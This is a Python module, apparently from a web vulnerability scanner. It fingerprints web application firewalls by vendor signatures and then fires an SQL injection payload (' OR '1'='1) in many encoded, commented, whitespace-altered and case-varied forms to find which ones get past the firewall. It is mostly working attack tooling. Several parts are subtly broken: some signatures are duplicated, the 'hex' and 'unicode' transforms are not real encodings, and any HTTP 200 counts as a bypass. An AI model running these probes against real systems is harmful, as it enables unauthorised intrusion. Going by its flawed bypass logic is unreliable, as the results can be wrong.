import logging
from typing import Dict, List, Any, Optional, Tuple
from core.request_engine import RequestEngine
from core.payload_manager import PayloadManager

class WAFDetector:
    def __init__(self, request_engine: RequestEngine, payload_manager: PayloadManager):
        self.request_engine = request_engine
        self.payload_manager = payload_manager
        self.waf_signatures = self._load_waf_signatures()
        
    def _load_waf_signatures(self) -> Dict[str, List[str]]:
        """Load WAF signatures."""
        return {
            "mod_security": [
                "mod_security",
                "modsecurity",
                "NOYB",
                "This error was generated by Mod_Security",
                "ModSecurity Action Taken",
                "ModSecurity Alert",
                "ModSecurity: Access denied",
                "ModSecurity: Request blocked"
            ],
            "cloudflare": [
                "cloudflare",
                "ray-id:",
                "cf-ray",
                "cf-cache-status",
                "cf-request-id",
                "cf-browser-verification",
                "cf-visitor",
                "cf-connecting-ip",
                "cf-ipcountry"
            ],
            "akamai": [
                "akamai",
                "akamai-gtm",
                "akamai-ghost",
                "akamai-ssl",
                "akamai-ssl-tls",
                "akamai-ssl-tls-1.2",
                "akamai-ssl-tls-1.3"
            ],
            "imperva": [
                "incapsula",
                "incapsula incident",
                "incapsula incident id",
                "incapsula incident report",
                "incapsula incident details",
                "incapsula incident information",
                "incapsula incident summary",
                "incapsula incident status"
            ],
            "f5": [
                "f5",
                "bigip",
                "big-ip",
                "bigip-asm",
                "bigip-afm",
                "bigip-apm",
                "bigip-gtm",
                "bigip-ltm"
            ],
            "barracuda": [
                "barracuda",
                "barra_counter_session",
                "barra_counter_session=",
                "barra_counter_session=",
                "barra_counter_session="
            ],
            "fortinet": [
                "fortinet",
                "fortigate",
                "fortiguard",
                "fortiweb",
                "fortinet-ips",
                "fortinet-utm",
                "fortinet-waf"
            ],
            "palo_alto": [
                "palo alto",
                "paloalto",
                "pan-",
                "pan-",
                "pan-",
                "pan-",
                "pan-"
            ]
        }
        
    def detect_waf(self) -> Dict[str, Any]:
        """Detect WAF presence and type."""
        results = {
            "waf_detected": False,
            "waf_type": None,
            "signatures": [],
            "confidence": 0
        }
        
        try:
            # Send a normal request first
            normal_response, _ = self.request_engine.send_request()
            if not normal_response:
                return results
                
            # Send a request with a simple SQL injection payload
            payload = "' OR '1'='1"
            attack_response, _ = self.request_engine.send_request(payload=payload)
            if not attack_response:
                return results
                
            # Check for WAF signatures in headers and response
            headers = attack_response.headers
            response_text = attack_response.text.lower()
            
            detected_signatures = []
            for waf_type, signatures in self.waf_signatures.items():
                for signature in signatures:
                    # Check headers
                    for header_name, header_value in headers.items():
                        if signature.lower() in header_value.lower():
                            detected_signatures.append({
                                "type": waf_type,
                                "signature": signature,
                                "location": f"header: {header_name}"
                            })
                            
                    # Check response body
                    if signature.lower() in response_text:
                        detected_signatures.append({
                            "type": waf_type,
                            "signature": signature,
                            "location": "response body"
                        })
                        
            if detected_signatures:
                results["waf_detected"] = True
                results["signatures"] = detected_signatures
                
                # Determine WAF type and confidence
                waf_types = {}
                for sig in detected_signatures:
                    waf_type = sig["type"]
                    if waf_type not in waf_types:
                        waf_types[waf_type] = 0
                    waf_types[waf_type] += 1
                    
                if waf_types:
                    # Get the most common WAF type
                    most_common = max(waf_types.items(), key=lambda x: x[1])
                    results["waf_type"] = most_common[0]
                    results["confidence"] = (most_common[1] / len(detected_signatures)) * 100
                    
            return results
            
        except Exception as e:
            logging.error(f"Error detecting WAF: {str(e)}")
            return results
            
    def test_waf_bypass(self) -> List[Dict[str, Any]]:
        """Test various WAF bypass techniques."""
        bypass_results = []
        
        # Test different encoding techniques
        encoding_tests = [
            ("URL encoding", lambda x: x.replace("'", "%27").replace(" ", "%20")),
            ("Double URL encoding", lambda x: x.replace("'", "%2527").replace(" ", "%2520")),
            ("Hex encoding", lambda x: x.replace("'", "0x27").replace(" ", "0x20")),
            ("Unicode encoding", lambda x: x.replace("'", "u0027").replace(" ", "u0020")),
            ("HTML encoding", lambda x: x.replace("'", "&#39;").replace(" ", "&#32;"))
        ]
        
        # Test different comment styles
        comment_tests = [
            ("MySQL comments", lambda x: x + " --"),
            ("MySQL comments with space", lambda x: x + " -- "),
            ("MySQL comments with newline", lambda x: x + " --\n"),
            ("MySQL comments with hash", lambda x: x + " #"),
            ("MySQL comments with hash and space", lambda x: x + " # "),
            ("MySQL comments with hash and newline", lambda x: x + " #\n")
        ]
        
        # Test different string concatenation
        concat_tests = [
            ("MySQL concat", lambda x: x.replace("'", "CONCAT(CHAR(39))")),
            ("PostgreSQL concat", lambda x: x.replace("'", "CHR(39)")),
            ("MSSQL concat", lambda x: x.replace("'", "CHAR(39)"))
        ]
        
        # Test different whitespace techniques
        whitespace_tests = [
            ("Tab", lambda x: x.replace(" ", "\t")),
            ("Newline", lambda x: x.replace(" ", "\n")),
            ("Carriage return", lambda x: x.replace(" ", "\r")),
            ("Form feed", lambda x: x.replace(" ", "\f")),
            ("Vertical tab", lambda x: x.replace(" ", "\v")),
            ("Multiple spaces", lambda x: x.replace(" ", "  "))
        ]
        
        # Test different case variations
        case_tests = [
            ("Uppercase", lambda x: x.upper()),
            ("Lowercase", lambda x: x.lower()),
            ("Mixed case", lambda x: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(x)))
        ]
        
        # Combine all tests
        all_tests = encoding_tests + comment_tests + concat_tests + whitespace_tests + case_tests
        
        # Test each technique
        for test_name, transform_func in all_tests:
            try:
                # Get a basic SQL injection payload
                payload = "' OR '1'='1"
                transformed_payload = transform_func(payload)
                
                # Send request with transformed payload
                response, _ = self.request_engine.send_request(payload=transformed_payload)
                if not response:
                    continue
                    
                # Check if the request was successful (not blocked by WAF)
                if response.status_code == 200:
                    bypass_results.append({
                        "technique": test_name,
                        "payload": transformed_payload,
                        "status": "success",
                        "status_code": response.status_code
                    })
                    
            except Exception as e:
                logging.error(f"Error testing WAF bypass technique {test_name}: {str(e)}")
                continue
                
        return bypass_results
        
    def get_waf_info(self) -> Dict[str, Any]:
        """Get detailed WAF information."""
        waf_detection = self.detect_waf()
        bypass_results = self.test_waf_bypass()
        
        return {
            "detection": waf_detection,
            "bypass_techniques": bypass_results,
            "recommendations": self._get_waf_recommendations(waf_detection)
        }
        
    def _get_waf_recommendations(self, waf_detection: Dict[str, Any]) -> List[str]:
        """Get recommendations based on WAF detection results."""
        recommendations = []
        
        if not waf_detection["waf_detected"]:
            recommendations.append("No WAF detected. Consider implementing a WAF for better security.")
            return recommendations
            
        waf_type = waf_detection["waf_type"]
        confidence = waf_detection["confidence"]
        
        if confidence < 50:
            recommendations.append(f"Low confidence WAF detection ({confidence}%). Consider manual verification.")
            
        if waf_type == "mod_security":
            recommendations.extend([
                "ModSecurity detected. Consider updating to the latest version.",
                "Review ModSecurity rules and adjust sensitivity if needed.",
                "Enable ModSecurity audit logging for better monitoring."
            ])
        elif waf_type == "cloudflare":
            recommendations.extend([
                "Cloudflare WAF detected. Consider enabling additional security features.",
                "Review Cloudflare security settings and rules.",
                "Enable Cloudflare logging for better monitoring."
            ])
        elif waf_type == "imperva":
            recommendations.extend([
                "Imperva WAF detected. Consider updating to the latest version.",
                "Review Imperva security policies and rules.",
                "Enable Imperva logging for better monitoring."
            ])
        else:
            recommendations.append(f"Consider reviewing {waf_type} WAF configuration and rules.")
            
        return recommendations 
